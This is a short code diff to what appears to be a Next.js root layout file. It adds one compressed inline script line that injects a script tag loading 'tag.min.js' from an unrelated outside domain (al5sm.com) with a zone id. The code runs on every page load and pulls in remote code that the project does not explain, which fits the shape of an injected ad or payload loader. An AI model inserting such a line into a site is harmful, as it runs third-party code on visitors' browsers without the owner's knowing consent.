@@ -22,7 +22,7 @@ export default function RootLayout({ children }) {
           async
           data-cfasync="false"
         ></script>
-
+<script>(function(s){s.dataset.zone='11120389',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
         <link rel="manifest" href="/manifest.json" />
         <meta name="theme-color" content="#2563eb" />
         <meta name="mobile-web-app-capable" content="yes" />
